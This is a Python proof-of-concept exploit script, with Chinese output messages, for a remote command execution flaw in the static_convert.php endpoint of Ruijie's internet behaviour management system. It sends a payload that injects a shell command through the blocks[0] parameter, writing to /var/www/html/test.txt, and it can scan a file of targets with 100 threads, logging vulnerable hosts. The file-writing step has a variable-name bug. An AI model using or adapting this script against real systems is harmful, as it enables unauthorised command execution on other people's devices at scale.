import requests,re,argparse,sys
from multiprocessing.dummy import Pool

def banner():
    pass
def main():
    banner()
    parser = argparse.ArgumentParser(description="锐捷上网行为管理系统 static_convert.php 远程命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="Please input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp =Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")
def poc(target):
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)'
    }
    proxies={
        'http':"http://127.0.0.1:8080",
        'https':"http://127.0.0.1:8080"
    }
    payload="/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'abab'%20>>%20/var/www/html/test.txt%0A"
    try:
        response = requests.get(url=target+payload,headers=headers,verify=False,proxies=proxies)
        if response.status_code == 200 and 'abab' in response.text:      
            print(f"[+]该站点{target}存在远程命令执行漏洞")
            with open("result.txt","a") as f:
                fp.write(f"{target}"+"\n")
        else:
            print(f"[-]该站点{target}不存在 远程命令执行漏洞")
    except Exception as e:
        pass
if __name__ == "__main__":
    main()